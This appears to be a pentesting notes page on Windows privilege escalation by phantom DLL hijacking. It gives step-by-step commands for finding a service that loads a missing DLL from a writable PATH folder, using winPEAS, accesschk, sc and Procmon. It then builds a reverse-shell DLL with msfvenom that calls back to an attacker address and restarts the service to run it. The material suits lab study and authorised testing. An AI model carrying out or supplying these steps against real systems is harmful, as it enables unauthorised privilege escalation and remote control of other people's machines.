# Phantom DLL Hijacking

In this type of DLL we target a missing dll and place our own dll instead.

## <mark style="color:red;">Finding the target</mark>

Use winPEAS to enumerate non-Windows services:

```
winPEASany.exe quiet servicesinfo
```

![](<../../../../.gitbook/assets/image (71).png>)

Note that the C:\Temp directory is writable and in the PATH. Start by enumerating which of these services our user has stop and start access to:

```
accesschk.exe /accepteula -uvqc user dllsvc
```

![](<../../../../.gitbook/assets/image (81) (1).png>)

The “dllsvc” service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. We can confirm this manually:

```
 sc qc dllsvc
```

![](<../../../../.gitbook/assets/image (74) (1).png>)

![](<../../../../.gitbook/assets/image (88) (1).png>)

in a real-world scenario we would download the executable to our own windows machine of analysis.then create a new service for the binary file that we copied and give it the path of the service binary and continue to the next steps:

create a service for the binary in our own system

```
sc create binPath= c:\temp\dllhijackservice.exe type= own 
```

Run Procmon64.exe with administrator privileges. Press Ctrl+L to open the Filter menu.

Add a new filter on the Process Name matching dllhijackservice.exe

![](<../../../../.gitbook/assets/image (78).png>)

On the main screen, deselect registry activity and network activity.

![](<../../../../.gitbook/assets/image (102).png>)

Start the service:

```
net start dllsvc
```

![](<../../../../.gitbook/assets/image (80).png>)

​​Back in Procmon, note that a number of “NAME NOT FOUND” errors appear, associated with the hijackme.dll file.

![](<../../../../.gitbook/assets/image (103) (1).png>)

At some point, Windows tries to find the file in the C:\Temp directory, which as we found earlier, is writable by our user.

## <mark style="color:red;">Exploitation</mark>

On Kali, generate a reverse shell DLL named hijackme.dll:

```
msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.1 lport=5555 -f dll -o VirtualBox\ VMs/shares/hijackme.dll
```

Copy the DLL to the Windows VM and into the C:\Temp directory. Start a listener on Kali and then stop/start the service to trigger the exploit:

```
net stop dllsvc
net start dllsvc
```

![](<../../../../.gitbook/assets/image (90) (1).png>)
